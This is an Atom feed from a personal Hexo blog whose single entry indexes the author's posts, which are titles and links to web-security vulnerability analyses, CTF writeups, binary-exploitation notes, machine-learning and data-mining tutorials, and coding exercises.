<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chybeta.github.io/"/>
  <updated>2018-05-12T00:05:43.655Z</updated>
  <id>http://chybeta.github.io/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一些文章</title>
    <link href="http://chybeta.github.io/3017/07/26/%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0/"/>
    <id>http://chybeta.github.io/3017/07/26/一些文章/</id>
    <published>3017-07-26T11:27:04.000Z</published>
    <updated>2018-05-12T00:05:43.655Z</updated>
    
    <content type="html"><![CDATA[<p>一些自己写的文章。<br><a id="more"></a></p>
<h1 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h1><ul>
<li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc:CMS渗透测试框架 </a></li>
<li><a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="external">Web-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="external">Software-Security-Learning</a></li>
<li><a href="https://github.com/CHYbeta/Code-Audit-Challenges" target="_blank" rel="external">Code-Audit-Challenges</a></li>
<li><a href="https://chybeta.gitbooks.io/the-path-to-machine-learning/content/" target="_blank" rel="external">The Path to Machine Learning</a></li>
<li><a href="https://book.ph0en1x.com/" target="_blank" rel="external">Awesome CTF Book</a></li>
<li><a href="https://chybeta.gitbooks.io/vuln-time/content/" target="_blank" rel="external">Vuln-Time</a></li>
</ul>
<h1 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
<li><a href="https://chybeta.github.io/2018/03/10/XSStrike-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/">XSStrike 源码阅读</a></li>
<li><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">php文件包含漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">命令执行的一些绕过技巧</a></li>
<li><a href="https://chybeta.github.io/2017/07/26/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">php代码执行漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/">MySql注入备忘录</a></li>
<li><a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/">php代码审计小总结 </a></li>
<li><a href="https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">小试XML实体注入攻击 </a></li>
<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">浅谈php反序列化漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/13/%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell/">利用PHP的OPcache机制getshell</a></li>
</ul>
<h2 id="Vuln-Analysis"><a href="#Vuln-Analysis" class="headerlink" title="Vuln Analysis"></a>Vuln Analysis</h2><ul>
<li><a href="https://chybeta.github.io/2018/05/12/RCE-with-spring-security-oauth2-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1260%E3%80%91/">RCE with spring-security-oauth2 分析-【CVE-2018-1260】</a></li>
<li><a href="https://chybeta.github.io/2018/05/08/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-003%E5%92%8CS3-005/">【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005</a></li>
<li><a href="https://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-%E5%88%86%E6%9E%90/">GitList 0.6 Unauthenticated RCE 分析</a></li>
<li><a href="https://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1273%E3%80%91/">Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</a></li>
<li><a href="https://chybeta.github.io/2018/04/10/Thinkphp%E6%A1%86%E6%9E%B6-5-0-16-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a></li>
<li><a href="https://chybeta.github.io/2018/03/21/%E6%9F%90%E5%95%86%E5%9F%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">某商城文件上传漏洞与SQL注入漏洞 </a></li>
<li><a href="https://chybeta.github.io/2018/03/06/PostgreSQL-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8%E2%80%94%E3%80%90CVE-2018-1058%E3%80%91/">PostgreSQL 远程代码执行漏洞分析及利用—【CVE-2018-1058】</a></li>
<li><a href="https://chybeta.github.io/2018/03/05/%E6%9F%90CMS-5-X%E7%89%88%E6%9C%AC-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/">某CMS 5.X版本 管理员密码重置漏洞 </a></li>
<li><a href="https://chybeta.github.io/2018/02/27/%E6%9F%90CMS-V5-7-SP2-%E5%90%8E%E5%8F%B0Getshell/">某CMS V5.7 SP2 后台Getshell </a></li>
<li><a href="https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/">【struts2 命令/代码执行漏洞分析系列】S2-001 </a></li>
<li><a href="https://xianzhi.aliyun.com/forum/topic/1990" target="_blank" rel="external">阿里先知安全社区：Electron &lt; v1.8.2-beta.4 远程命令执行漏洞—【CVE-2018-1000006】</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/topic/1983" target="_blank" rel="external">阿里先知安全社区：Smarty &lt;= 3.1.32 PHP代码执行漏洞分析—【CVE-2017-1000480】</a></li>
<li><a href="https://chybeta.github.io/2017/12/26/axublog-v1-0-6-%E4%B8%A4%E5%A4%84sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">axublog v1.0.6 两处sql注入分析 </a></li>
<li><a href="https://chybeta.github.io/2017/12/17/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/">AppCMS 2.0.101 后门分析 </a></li>
<li><a href="https://chybeta.github.io/2017/12/11/CVE-2016-7565-Exponent-CMS-2-3-9-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-getshell%E5%88%86%E6%9E%90/">[CVE-2016-7565]Exponent CMS 2.3.9 配置文件写入 getshell分析</a></li>
<li><a href="https://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/">Node.js中的反序列化漏洞：CVE-2017-5941 </a></li>
<li><a href="https://chybeta.github.io/2017/10/15/DiscuzX-v3-4-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/">DiscuzX v3.4 任意文件删除漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ICMSv7.0.1 admincp.class.php sql注入分析 </a></li>
<li><a href="https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 wap模块sql注入漏洞分析</a></li>
<li><a href="https://chybeta.github.io/2017/07/22/PHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">PHPCMS v9.6.0 任意文件上传漏洞分析 </a></li>
<li><a href="https://chybeta.github.io/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/">Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</a></li>
<li><a href="https://chybeta.github.io/2017/05/19/CVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/">[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析 </a></li>
<li><a href="https://chybeta.github.io/2017/03/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%9ABlueCMSv1-6-sp1/">代码审计之SQL注入：BlueCMSv1.6 sp1 </a></li>
</ul>
<h1 id="Bin-Security"><a href="#Bin-Security" class="headerlink" title="Bin Security"></a>Bin Security</h1><ul>
<li><a href="https://chybeta.github.io/2017/10/19/Linux-kernel-development-1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/">Linux kernel development (1): 环境准备 </a></li>
<li><a href="https://chybeta.github.io/2017/08/14/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">逆向学习笔记（一）</a></li>
<li><a href="https://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/#more">ROP学习：利用通用gadget </a></li>
<li><a href="https://chybeta.github.io/2017/06/26/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/">ROP学习：64位栈溢出</a></li>
</ul>
<h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><ul>
<li><a href="https://chybeta.github.io/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/">机器学习算法：最近邻(KNN)</a></li>
<li><a href="https://chybeta.github.io/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/">机器学习算法：感知机(perceptron) </a></li>
<li><a href="https://chybeta.github.io/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/">Tensorflow学习：常用API</a></li>
<li><a href="https://chybeta.github.io/2017/03/15/win%E4%B8%8Btensorflow%E5%AE%89%E8%A3%85%E9%81%BF%E5%9D%91%E6%8C%87%E5%8D%97-0/">win下tensorflow安装避坑指南</a></li>
</ul>
<h1 id="数据挖掘"><a href="#数据挖掘" class="headerlink" title="数据挖掘"></a>数据挖掘</h1><ul>
<li><a href="https://chybeta.github.io/2017/01/22/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%880%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B9%8Banaconda%E5%AE%89%E8%A3%85/">数据挖掘比赛（0）环境搭建之anaconda安装</a></li>
<li><a href="https://chybeta.github.io/2017/01/24/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%881%EF%BC%89%E5%AF%B9%E6%97%A0%E5%88%97%E5%90%8D%E7%9A%84txt%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AF%BB%E5%8F%96%E6%96%B9%E6%B3%95%E5%8F%8A%E5%A4%84%E7%90%86/">数据挖掘比赛（1）对无列名的txt数据集读取方法及处理</a></li>
<li><a href="https://chybeta.github.io/2017/01/25/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8pandas%E8%AF%BB%E5%8F%96%E5%A4%A7%E5%9E%8B%E6%95%B0%E6%8D%AE%E9%9B%86/">数据挖掘比赛（2）利用pandas读取大型数据集</a></li>
<li><a href="https://chybeta.github.io/2017/01/29/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%883%EF%BC%89%E7%94%B3%E8%AF%B7anaconda-academic-license%E5%B9%B6%E4%BD%BF%E7%94%A8/">数据挖掘比赛（3）申请anaconda-academic-license并使用</a></li>
<li><a href="https://chybeta.github.io/2017/02/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%884%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8A/">数据挖掘比赛（4）ten Minutes to pandas中文版上 </a></li>
<li><a href="https://chybeta.github.io/2017/02/02/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%E6%AF%94%E8%B5%9B%EF%BC%885%EF%BC%89ten-Minutes-to-pandas%E4%B8%AD%E6%96%87%E7%89%88%E4%B8%8B/">数据挖掘比赛（5）ten Minutes to pandas中文版下</a></li>
</ul>
<h1 id="技术杂谈"><a href="#技术杂谈" class="headerlink" title="技术杂谈"></a>技术杂谈</h1><ul>
<li><a href="https://chybeta.github.io/2017/09/20/Flask-Web%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0-1-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/">Flask Web开发笔记(1):程序的基本结构 </a></li>
<li><a href="https://chybeta.github.io/2017/09/04/hexo-rss%E9%93%BE%E6%8E%A5%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/">hexo-rss链接问题修复方法</a></li>
<li><a href="https://chybeta.github.io/2017/02/14/win%E4%B8%8BDocker%E9%BB%98%E8%AE%A4%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE%E4%BF%AE%E6%94%B9/">win下Docker默认存储位置修改</a></li>
<li><a href="https://chybeta.github.io/2017/02/13/windows%E5%B9%B3%E5%8F%B0%E4%B8%8BDocker%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">windows平台下Docker环境搭建</a></li>
</ul>
<h1 id="编程练习"><a href="#编程练习" class="headerlink" title="编程练习"></a>编程练习</h1><ul>
<li><a href="https://chybeta.github.io/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/">ACM-OJ[长期更新]</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/hihoCoder-162%E5%91%A8%EF%BC%9A%E5%9B%9E%E6%96%87%E5%AD%97%E7%AC%A6%E4%B8%B2/">hihoCoder 162周：回文字符串 </a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-3-%E6%95%B0%E7%BB%84%E5%8D%95%E8%B0%83%E5%92%8C/">CodeTrain(3)数组单调和</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-2-%E6%A3%8B%E5%AD%90%E7%BF%BB%E8%BD%AC/">CodeTrain(2)棋子翻转</a></li>
<li><a href="https://chybeta.github.io/2017/03/02/CodeTrain-1-%E6%9C%80%E5%A4%A7%E5%B7%AE%E5%80%BC/">CodeTrain(1)最大差值</a></li>
</ul>
<h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><ul>
<li><a href="https://chybeta.github.io/2017/02/17/%E8%AE%B02017%E5%B9%B4%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E4%B9%8B%E8%A1%8C/"> 记2017年阿里巴巴之行
</a></li>
</ul>
<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2018/03/25/Python-is-the-best-language-writeup/">Python is the best language-writeup </a></li>
<li><a href="https://xianzhi.aliyun.com/forum/topic/2013" target="_blank" rel="external">AceBear Security Contest-Tet Shopping-Writeup</a></li>
<li><a href="https://chybeta.github.io/2018/01/29/AceBear-Security-Contest-%E9%83%A8%E5%88%86Web-writeup/">AceBear Security Contest-部分Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2018/01/23/Insomni-hack-teaser-2018-Smart-Y-writeup/">Insomni’hack teaser 2018-Smart-Y-writeup</a></li>
<li><a href="https://chybeta.github.io/2018/01/21/Insomni-hack-teaser-2018-VulnShop-writeup/">Insomni’hack teaser 2018-VulnShop-writeup</a></li>
<li><a href="https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/">赛博地球杯工业互联网安全大赛-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道CTF题：PHP文件包含 </a></li>
<li><a href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/">HITCON CTF 2017-BabyFirst Revenge-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/">2017年百越杯AWD-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/22/Hack-lu-CTF-2017-Flatscience-writeup/">Hack.lu CTF 2017-Flatscience-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/10/05/Square-CTF-2017-Web-writeup/">Square CTF 2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/">BackdoorCTF 2017-Extends Me-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/">CSAW CTF 2017-LittleQuery-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Shia-Labeouf-off-writeup/">CSAW CTF 2017-Shia Labeouf-off-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/">CSAW CTF 2017-Orange v1-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/16/%E9%97%AE%E9%BC%8E%E6%9D%AF-CTF-writeup/">问鼎杯 CTF writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/">SEC-T CTF2017-Naughty ads-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/">SEC-T CTF2017-Sprinkler system-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-GSA-File-Server-writeup/">ASISCTF2017-GSA File Server-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-Mathilda-writeup/">ASISCTF2017-Mathilda-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/08/WeChall-PHP-writeup/">WeChall-PHP-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/">TWCTF 2017-Super Secure Storage-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/">TWCTF 2017-Freshen Uploader-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/31/ISG2017-wmwcms-writeup/">ISG2017-wmwcms-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">HITB CTF 2017-Pasty-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-H4ck3rM1nd-writeup/">Hackit2017-H4ck3rM1nd-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-Weekands-of-hacker-writeup/">Hackit2017-Weekands of hacker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-V1rus3pidem1c-writeup/">Hackit2017-V1rus3pidem1c-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/28/Hackit2017-B3tterS0ci4lN3twork-writeup/">Hackit2017-B3tterS0ci4lN3twork-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Web-writeup/">HackCon2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/26/XNUCA2017-%E7%AC%AC%E4%B8%80%E6%9C%9F%EF%BC%9AWeb-writeup/">XNUCA2017-第一期：Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup/">XMAN夏令营-2017-XSS-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup/">XMAN夏令营-2017-比赛系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-default-writeup/">XNUCA 2017-Web专题赛前指导-default-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%98%B3%E5%85%89%E6%80%BB%E5%9C%A8%E9%A3%8E%E9%9B%A8%E5%90%8E-writeup/">XNUCA 2017-Web专题赛前指导-阳光总在风雨后-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/">XNUCA 2017-Web专题赛前指导-Document-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/">XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/">XNUCA 2017-Web专题赛前指导-vote-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/">XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E9%83%A8%E5%88%86%E7%AE%80%E5%8D%95%E9%A2%98%E6%B1%87%E6%80%BB-writeup/">XNUCA 2017-Web专题赛前指导-部分简单题汇总-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/">SHACTF-2017-Web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-web-writeup/">BugsBunnyCTF2017-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/">实验吧-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/19/CTFZone-2017-Leaked-messages-writeup/">CTFZone-2017-Leaked messages-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/">XMAN选拔赛-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/16/Meenpwn-2017-web-writeup/">Meenpwn-2017-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/">一道好玩的webshell题 </a></li>
<li><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/">jarvisoj-web-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-js-writeup/">ringzer0team-js-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/30/%C2%96ringzer0team-web-writeup/">ringzer0team-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/25/xss-quiz-writeup/">xss-quiz-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/19/GCTF-web-writeup/">GCTF-web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">“春秋杯”web-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/01/12/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3/">南邮CTF平台web前30题解</a></li>
</ul>
<h3 id="sqli-lab"><a href="#sqli-lab" class="headerlink" title="sqli-lab"></a>sqli-lab</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less17-writeup/">Sqli-Labs:Less17-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less15-16-writeup/">Sqli-Labs:Less15~16-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less13-14-writeup/">Sqli-Labs:Less13~14-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less11-12-writeup/">Sqli-Labs:Less11~12-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/23/Sqli-Labs-Less8-10-writeup/">Sqli-Labs:Less8~10-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less7-writeup/">Sqli-Labs:Less7-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/12/Sqli-Labs-Less5-6-writeup/">Sqli-Labs:Less5-6-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/04/02/Sqli-Labs-Less1-4-writeup/">Sqli-Labs:Less1-4-writeup</a></li>
</ul>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><a href="https://chybeta.github.io/2017/09/09/TWCTF-2017-swap-writeup/">TWCTF 2017-swap-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/12/Codegate-2017-Qual-babypwn-writeup/">Codegate 2017 Qual-babypwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-pwn-writeup/">BugsBunnyCTF2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-pwn-writeup/">XMAN选拔赛-2017-pwn-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/06/29/XMAN-pwn-writeup/">XMAN-pwn-writeup </a></li>
